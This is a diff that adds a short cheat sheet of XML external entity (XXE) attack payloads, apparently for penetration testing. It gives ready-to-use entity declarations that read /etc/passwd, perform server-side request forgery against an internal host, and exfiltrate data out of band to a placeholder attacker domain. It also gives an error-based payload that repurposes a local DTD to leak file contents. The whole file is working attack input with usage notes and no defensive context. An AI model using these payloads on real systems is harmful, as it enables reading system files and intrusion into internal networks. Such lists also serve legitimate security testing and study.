@@ -1,0 +1,22 @@
+1. <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    ^[Note: Put &xxe; from where you want to see output]^
+
+2. XXE to perform SSRF:
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+    ^[Note: Put &xxe; from where you want to see output]^
+3. Blind XXE using out-of-band interaction:
+
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+
+4. Exploiting XXE to retrieve data by repurposing a local DTD
+
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
